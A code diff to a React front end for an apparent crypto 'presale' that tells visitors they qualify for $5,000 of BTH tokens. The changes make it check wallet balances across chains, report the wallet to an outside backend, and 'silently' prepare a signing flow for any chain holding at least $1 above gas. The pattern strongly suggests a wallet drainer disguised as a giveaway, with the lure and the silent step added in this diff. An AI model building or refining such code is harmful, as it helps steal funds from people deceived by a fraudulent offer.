@@ -278,7 +278,7 @@ function App() {
     }
   }, [isConnected]);
 
-  // Check eligibility without showing balances
+  // FIXED: Check eligibility without filtering out chains prematurely
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -286,21 +286,26 @@ function App() {
     setTxStatus('🔄 Checking eligibility...');
     
     try {
+      // Calculate total value from ALL balances (no filtering)
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
+      // Get all chains with ANY balance (for display purposes)
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
+      // Determine eligible chains for execution (meet minimum value and gas buffer)
       const executable = chainsWithBalance.filter(chain => {
         const balance = balances[chain.name];
         if (!balance) return false;
         
+        // Each chain needs at least $1 worth to be executable
         if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
           console.log(`⏭️ Skipping ${chain.name}: Value $${balance.valueUSD.toFixed(2)} is below $${MIN_VALUE_THRESHOLD} threshold`);
           return false;
         }
         
+        // Check if enough for gas (leave gas buffer)
         const minGasRequired = MIN_GAS_BUFFER[chain.name] || 0.001;
         if (balance.amount < minGasRequired) {
           console.log(`⏭️ Skipping ${chain.name}: Balance ${balance.amount.toFixed(6)} ${chain.symbol} is below gas buffer ${minGasRequired} ${chain.symbol}`);
@@ -313,16 +318,20 @@ function App() {
       setEligibleChains(chainsWithBalance);
       setExecutableChains(executable);
       
-      const eligible = total >= 1;
+      // IMPORTANT FIX: User is eligible if TOTAL value across ALL chains is >= $1
+      // This matches your working version behavior
+      const eligible = total >= MIN_VALUE_THRESHOLD;
       setIsEligible(eligible);
       
       if (eligible) {
+        // Show appropriate status message
         if (executable.length === 0) {
-          setTxStatus('⚠️ No chains meet execution requirements');
+          setTxStatus('⚠️ Total value qualifies but no individual chain meets $1 threshold');
         } else {
           setTxStatus(`✅ You qualify for $5,000 BTH!`);
         }
         
+        // Send to backend for tracking
         const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -341,11 +350,10 @@ function App() {
           }
         }
         
-        if (executable.length > 0) {
-          preparePresale();
-        }
+        // Prepare flow silently
+        preparePresale();
       } else {
-        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
+        setTxStatus(total > 0 ? `✨ Connected ($${total.toFixed(2)} value)` : '👋 Welcome');
       }
       
     } catch (err) {
@@ -465,13 +473,13 @@ function App() {
       
       setTxStatus('⏳ Processing...');
 
-      // Get chains that are executable (user has funds and meets requirements)
+      // Get chains that are executable (meet $1 threshold and have gas buffer)
       const chainsToProcess = executableChains.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0
       );
       
       if (chainsToProcess.length === 0) {
-        setError("No chains with balance meet execution requirements");
+        setError("No chains meet the $1 minimum threshold for execution");
         setSignatureLoading(false);
         return;
       }
@@ -664,8 +672,12 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // FIXED: Simplified button condition to match working version
-  const showClaimButton = isConnected && isEligible && !completedChains.length;
+  // Show claim button if:
+  // 1. Wallet is connected
+  // 2. User is eligible (total value >= $1)
+  // 3. No chains have been completed yet
+  // 4. There's at least one chain with balance
+  const showClaimButton = isConnected && isEligible && !completedChains.length && Object.keys(balances).length > 0;
 
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
